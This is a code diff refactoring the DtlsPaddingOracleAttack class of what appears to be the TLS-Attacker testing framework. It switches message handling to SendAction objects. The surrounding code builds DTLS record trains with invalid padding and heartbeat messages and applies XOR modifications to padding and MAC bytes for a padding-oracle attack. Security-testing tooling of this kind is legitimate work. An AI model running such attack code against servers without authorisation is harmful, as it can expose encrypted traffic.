@@ -26,6 +26,8 @@ import de.rub.nds.tlsattacker.tls.constants.AlertLevel;
 import de.rub.nds.tlsattacker.tls.workflow.TlsContext;
 import de.rub.nds.tlsattacker.tls.workflow.WorkflowExecutor;
 import de.rub.nds.tlsattacker.tls.workflow.WorkflowTrace;
+import de.rub.nds.tlsattacker.tls.workflow.action.SendAction;
+import de.rub.nds.tlsattacker.tls.workflow.action.TLSAction;
 import de.rub.nds.tlsattacker.transport.UDPTransportHandler;
 import de.rub.nds.tlsattacker.util.RandomHelper;
 import java.io.FileWriter;
@@ -51,9 +53,7 @@ public class DtlsPaddingOracleAttack extends Attacker<DtlsPaddingOracleAttackCom
     private TlsContext tlsContext;
 
     private DtlsRecordHandler recordHandler;
-
-    private List<ProtocolMessage> protocolMessages;
-
+    private List<TLSAction> actionList;
     private UDPTransportHandler transportHandler;
 
     private final ModifiableByteArray modifiedPaddingArray = new ModifiableByteArray(),
@@ -213,8 +213,9 @@ public class DtlsPaddingOracleAttack extends Attacker<DtlsPaddingOracleAttackCom
     private byte[][] createInvalidPaddingMessageTrain(int n, byte[] messageData, HeartbeatMessage heartbeatMessage) {
 	byte[][] train = new byte[n + 1][];
 	List<de.rub.nds.tlsattacker.tls.record.Record> records = new ArrayList<>();
-	ApplicationMessage apMessage = new ApplicationMessage(ConnectionEnd.CLIENT);
-	protocolMessages.add(apMessage);
+	ApplicationMessage apMessage = new ApplicationMessage();
+	SendAction action = new SendAction(apMessage);
+	actionList.add(action);
 	DtlsRecord record;
 	apMessage.setData(messageData);
 
@@ -227,7 +228,7 @@ public class DtlsPaddingOracleAttack extends Attacker<DtlsPaddingOracleAttackCom
 	}
 
 	records.add(new DtlsRecord());
-	protocolMessages.add(heartbeatMessage);
+	action.getConfiguredMessages().add(heartbeatMessage);
 	train[n] = recordHandler.wrapData(heartbeatMessage.getCompleteResultingMessage().getValue(),
 		ProtocolMessageType.HEARTBEAT, records);
 
@@ -238,8 +239,9 @@ public class DtlsPaddingOracleAttack extends Attacker<DtlsPaddingOracleAttackCom
 	    HeartbeatMessage heartbeatMessage) {
 	byte[][] train = new byte[n + 1][];
 	List<de.rub.nds.tlsattacker.tls.record.Record> records = new ArrayList<>();
-	ApplicationMessage apMessage = new ApplicationMessage(ConnectionEnd.CLIENT);
-	protocolMessages.add(apMessage);
+	ApplicationMessage apMessage = new ApplicationMessage();
+	SendAction action = new SendAction(apMessage);
+	actionList.add(action);
 	apMessage.setData(applicationMessageContent);
 
 	DtlsRecord record = new DtlsRecord();
@@ -255,7 +257,7 @@ public class DtlsPaddingOracleAttack extends Attacker<DtlsPaddingOracleAttackCom
 
 	records.remove(0);
 	records.add(new DtlsRecord());
-	protocolMessages.add(heartbeatMessage);
+	action.getConfiguredMessages().add(heartbeatMessage);
 	train[n] = (recordHandler.wrapData(heartbeatMessage.getCompleteResultingMessage().getValue(),
 		ProtocolMessageType.HEARTBEAT, records));
 
@@ -283,7 +285,7 @@ public class DtlsPaddingOracleAttack extends Attacker<DtlsPaddingOracleAttackCom
 	workflowExecutor = configHandler.initializeWorkflowExecutor(transportHandler, tlsContext);
 	recordHandler = (DtlsRecordHandler) tlsContext.getRecordHandler();
 	trace = tlsContext.getWorkflowTrace();
-	protocolMessages = trace.getProtocolMessages();
+	actionList = trace.getTLSActions();
 	modifiedPaddingArray.setModification(ByteArrayModificationFactory.xor(new byte[] { 1 }, 0));
 	modifiedMacArray.setModification(ByteArrayModificationFactory.xor(new byte[] { 0x50, (byte) 0xFF, 0x1A, 0x7C },
 		0));
